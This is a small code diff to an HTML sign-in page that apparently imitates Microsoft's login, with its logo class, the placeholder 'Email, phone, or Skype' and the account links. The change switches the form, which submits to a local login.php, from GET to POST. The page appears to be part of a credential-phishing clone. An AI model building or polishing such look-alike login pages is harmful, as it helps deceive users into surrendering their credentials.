@@ -10,7 +10,7 @@
       <div class="ms-logo"></div>
       <h1 class="heading">Sign in</h1>
       <div class="w-form">
-        <form method="get" action="login.php">
+        <form method="post" action="login.php">
           <input type="email" class="text-field w-input" autofocus="true" maxlength="256" name="email" data-name="email" placeholder="Email, phone, or Skype" required="" />
           <div class="text-block">No account? <a href="#" class="link">Create one!</a></div>
           <div class="text-block"><a href="#" class="link">Can&#x27;t access your account?</a></div>
